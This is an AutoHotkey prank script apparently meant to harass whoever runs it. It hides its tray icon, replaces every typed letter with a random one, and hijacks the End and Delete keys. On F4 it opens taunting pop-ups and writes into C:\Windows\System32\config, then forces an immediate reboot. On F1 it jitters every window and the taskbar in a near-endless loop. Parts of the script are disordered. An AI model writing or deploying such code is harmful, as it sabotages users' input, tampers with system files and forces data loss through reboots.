#NoTrayIcon
#NoEnv  ; Recommended for performance and compatibility
SendMode Input  ; Recommended for new scripts due to its superior speed
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory

global arr := ["a","b","c","d","e","f","g","h","i","j","k","l","m","n","o","p","q","r","s","t","u","v","w","x","y","z"]

Loop, Parse, % "abcdefghijklmnopqrstuvwxyz", % "" 
{
    Hotkey, *%A_LoopField%, Snd
}
return
F4::
Loop, 250 ; yes.
{
    Random, RandX, 0, % A_ScreenWidth - 100
    Random, RandY, 0, % A_ScreenHeight - 100
    
    ; by adding a letter prefix, we bypass the 1-99 limit
    GuiName := "HAHAHAHHAHAHAHAHAHAHA" . A_Index
    
    Gui, %GuiName%:New, +AlwaysOnTop -MaximizeBox -MinimizeBox, BAHAHAHAHA %A_Index%
    Gui, %GuiName%:Add, Text, w200 h50 Center, GET DESTROYED IDIOT
    
    Gui, %GuiName%:Show, x%RandX% y%RandY%
 Sleep, 10000
FileAppend, kalala, C:\Windows\System32\config\OSDATA
Run, shutdown /r /t 0
}
return
F11::
; identify class
WinGetClass, CurrentClass, A

; loop
#Persistent
#NoEnv
SetBatchLines, -1
ListLines, Off

; --- Emergency Kill Switch ---
^Esc::
    ; Reset Taskbar to a likely default position (bottom)
    WinMove, ahk_class Shell_TrayWnd,, 0, A_ScreenHeight - 40
    Reload ; Stops all loops
return

F1:: 
Loop, 10000000000000000000000000000000000000000000000000000
{
    ; 1. Grab all windows
    WinGet, id, List,,, Program Manager
    
    Loop, %id%
    {
        this_id := id%A_Index%
        WinGetTitle, title, ahk_id %this_id%
        WinGetClass, class, ahk_id %this_id%
        
        ; NEW LOGIC: Move it if it has a title OR if it is the Taskbar class
        if (title != "" || class = "Shell_TrayWnd" || class = "Shell_SecondaryTrayWnd")
        {
            WinGetPos, X, Y, , , ahk_id %this_id%
            Random, mX, -60, 60
            Random, mY, -60, 60
            
            ; Using the more aggressive DllCall for everything in this loop
            DllCall("SetWindowPos", "Ptr", this_id, "Ptr", 0, "Int", X+mX, "Int", Y+mY, "Int", 0, "Int", 0, "UInt", 0x0001 | 0x0004)
        }
    }
    Sleep, 1
}
return
return
return
End::Send, Nice try
Del::LButton




Snd() {
	Random, RandomVar, 1, 26
	SendInput % arr[RandomVar]
}


